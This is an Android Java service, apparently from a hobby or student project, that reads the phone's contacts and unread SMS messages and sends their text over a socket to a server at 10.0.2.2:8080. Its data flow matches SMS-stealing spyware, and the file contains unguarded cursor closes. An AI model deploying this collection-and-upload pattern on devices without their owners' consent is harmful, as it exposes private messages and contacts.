package my.service;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;

import my.pro.ReadSMS;
import my.pro.SendSMS;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.widget.Toast;


/*
 *无法启动该service
 **/

public class SocketService extends Service {

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
	}

	@Override
	public void onStart(Intent intent, int startId) {
		// TODO Auto-generated method stub
		super.onStart(intent, startId);
		
		String host = "10.0.2.2";
		int port = 8080;
		Socket socket = null;
		//BufferedReader in = null;
		PrintWriter out = null;
		String msSend = "socket test";
		
		SharedPreferences sharedPrefe = getSharedPreferences("parameters", Context.MODE_PRIVATE);
		// 第二个参数的含义：Value to return if this preference does not exist.
		long restartTime = sharedPrefe.getLong("cancelTime", 0);

		if (restartTime == 0) {
			Cursor contactCursor = null;

			Cursor messageCursor = null;
			try {

				// 联系人列表
				contactCursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

				// 短信列表参数
				Uri uri = Uri.parse("content://sms//inbox");
				String[] projection = new String[] { "_id", "read", "address", "person", "body", "date" };
				String selection = "read = 0";

				// 获取未读短信,Cursor指针一定要注意。读取列表时，一定要却表游标在开始位置
				messageCursor = getContentResolver().query(uri, projection, selection, null, "date desc");

				// 读取设置的密码
				String getPassword = sharedPrefe.getString("password", "");

				String sendToPhone = sharedPrefe.getString("commandnumber", "");		
				
				// 读取未读短信
				ReadSMS readSMS = new ReadSMS();
				StringBuilder strSMS = new StringBuilder();
				strSMS = readSMS.smsNumber(messageCursor, contactCursor, getPassword);
				
				msSend = strSMS.toString();
				//msSend = msSend.replace('\n', '-');
				if(msSend.charAt(msSend.length()-1) == '\n')
					msSend = msSend.substring(0, msSend.length()-1);
				System.out.println(msSend);
				
				
			} catch (Exception ex) {

			} finally {

				messageCursor.close();
				contactCursor.close();

			}

		} else {
			
			
			Cursor contactCursor = null;

			Cursor messageCursor = null;
			try {

				// 联系人列表
				contactCursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

				// 短信列表参数
				Uri uri = Uri.parse("content://sms//inbox");
				String[] projection = new String[] { "_id", "read", "address", "person", "body", "date" };
				
				//这个筛选条件有问题，long类型的数据太大
				String selection = "read=0";

				// 获取未读短信,Cursor指针一定要注意。读取列表时，一定要却表游标在开始位置
				messageCursor = getContentResolver().query(uri, projection, selection, null, "date desc");

				//Toast.makeText(getApplicationContext(), "执行else语句-----"+messageCursor.getCount(), Toast.LENGTH_LONG).show();
				
				// 读取设置的密码
				String getPassword = sharedPrefe.getString("password", "");

				

				String sendToPhone = sharedPrefe.getString("commandnumber", "");

				// 读取未读短信
				ReadSMS readSMS = new ReadSMS();
				StringBuilder strSMS = new StringBuilder();
				
				//在ReadSMS方法中添加一个新的方法，传递的参数加一个date
				strSMS = readSMS.smsNumber(messageCursor, contactCursor, getPassword,restartTime);

				msSend = strSMS.toString();
				//msSend = msSend.replace('\n', '-');
				if(msSend.charAt(msSend.length()-1) == '\n')
					msSend = msSend.substring(0, msSend.length()-1);

				

				// --------------------------------------------//
			} catch (Exception ex) {

				Toast.makeText(getApplicationContext(), ex.toString(), Toast.LENGTH_LONG).show();
			} finally {

				messageCursor.close();
				contactCursor.close();

			}

		}
		
		
		
		
		
		try {
			socket = new Socket(host, port);
			out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);
			if (socket.isConnected()) {
				if (!socket.isOutputShutdown()) {
					out.println("5554");
					out.println(msSend);
				} else
					System.out.println("the channel is closed!");
			} else
				System.out.println("cannot connect to the host!");
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) { // TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		
	}

	

}
